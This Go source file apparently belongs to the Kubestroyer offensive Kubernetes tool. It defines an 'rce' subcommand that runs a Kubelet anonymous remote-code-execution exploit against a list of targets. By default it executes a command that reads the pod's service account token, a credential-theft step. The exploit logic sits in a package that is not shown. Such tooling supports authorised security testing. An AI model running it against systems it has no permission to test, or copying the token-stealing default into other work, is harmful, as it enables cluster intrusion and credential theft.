package cli

import (
	"fmt"

	"github.com/Rolix44/Kubestroyer/internal/display"
	"github.com/Rolix44/Kubestroyer/internal/exploit"
	"github.com/spf13/cobra"
)

func newRCECmd(opts *RootOptions) *cobra.Command {
	var command string

	cmd := &cobra.Command{
		Use:   "rce",
		Short: "Exploit Kubelet anonymous RCE on target(s)",
		RunE: func(cmd *cobra.Command, args []string) error {
			for _, target := range opts.Targets {
				err := exploit.RunRCE(cmd.Context(), exploit.KubeletOptions{
					Target:      target,
					Command:     command,
					HTTPTimeout: opts.HTTPTimeout,
				})
				if err != nil {
					fmt.Printf("RCE error for %s: %v\n", target, err)
				}
				fmt.Println(display.Split)
			}
			return nil
		},
	}

	cmd.Flags().StringVarP(&command, "command", "x", "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "Command to execute")
	return cmd
}
